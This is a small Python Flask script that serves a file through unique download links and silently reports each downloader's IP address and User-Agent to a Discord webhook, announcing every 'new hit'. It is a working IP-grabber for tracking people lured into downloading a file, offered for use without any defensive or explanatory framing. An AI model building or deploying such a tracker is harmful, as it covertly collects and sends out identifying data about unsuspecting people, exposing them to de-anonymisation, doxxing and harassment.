from flask import Flask, request, send_from_directory, abort, jsonify
import requests
import os
import uuid

app = Flask(__name__)

FILE_DIRECTORY = r"FILE_DIRECTORY"
DISCORD_WEBHOOK_URL = "YOUR_WEBHOOK"

def send_webhook_notification(ip, user_agent, file_name):
    data = {
        "content": f"@everyone new hit: \nIP: {ip}\nUser-Agent: {user_agent}"
    }
    response = requests.post(DISCORD_WEBHOOK_URL, json=data)
    if response.status_code != 204:
        print(f"Failed to send webhook: {response.status_code}, {response.text}")

@app.route('/generate_link/<filename>')
def generate_link(filename):
    if not os.path.isfile(os.path.join(FILE_DIRECTORY, filename)):
        return jsonify({"error": "File not found"}), 404
    
    unique_id = str(uuid.uuid4())
    download_url = f"{request.host_url}download/{unique_id}/{filename}"
    
    app.config[unique_id] = filename
    
    return jsonify({"download_url": download_url})

@app.route('/download/<unique_id>/<filename>')
def download_file(unique_id, filename):
    if unique_id not in app.config or app.config[unique_id] != filename:
        abort(404)
    
    try:
        ip = request.remote_addr
        user_agent = request.headers.get('User-Agent')
        
        send_webhook_notification(ip, user_agent, filename)
        
        return send_from_directory(FILE_DIRECTORY, filename, as_attachment=True)
    except FileNotFoundError:
        abort(404)

def generate_and_print_download_link(filename):
    if not os.path.isfile(os.path.join(FILE_DIRECTORY, filename)):
        print("File not found")
        return
    
    unique_id = str(uuid.uuid4())
    download_url = f"http://localhost:5000/download/{unique_id}/{filename}"
    
    app.config[unique_id] = filename
    
    print(f"Download link: {download_url}")

if __name__ == '__main__':
    filename = "f.zip"
    generate_and_print_download_link(filename)
    
    app.run(host='0.0.0.0', port=5000)